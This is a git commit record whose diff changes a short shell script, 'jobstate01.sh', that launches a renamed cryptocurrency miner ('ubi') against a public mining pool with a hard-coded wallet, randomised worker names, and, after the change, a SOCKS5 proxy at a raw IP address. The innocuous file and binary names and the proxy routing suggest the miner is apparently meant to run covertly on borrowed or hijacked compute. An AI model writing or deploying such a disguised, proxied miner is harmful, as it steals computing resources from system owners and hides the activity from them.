e2e2485c1938b15776989a6f863d9d1e9cf0d214
rerpes <93594805+rerpes@users.noreply.github.com>
2021-11-02 20:36:25 +0700

    Update jobstate01.sh

--- jobstate01.sh
+++ jobstate01.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 chmod +x verus-solver
 chmod +x ubi
-./ubi -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBfBRKqh6b3LFxMWFRdfFcPfdboN5jptXN.$(echo $(shuf -i 10-299 -n 1)-ANDRO-X) -p x
+./ubi -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBfBRKqh6b3LFxMWFRdfFcPfdboN5jptXN.$(echo $(shuf -i 10-299 -n 1)-ANDRO-X) -p x -x socks5://192.252.209.155:14455
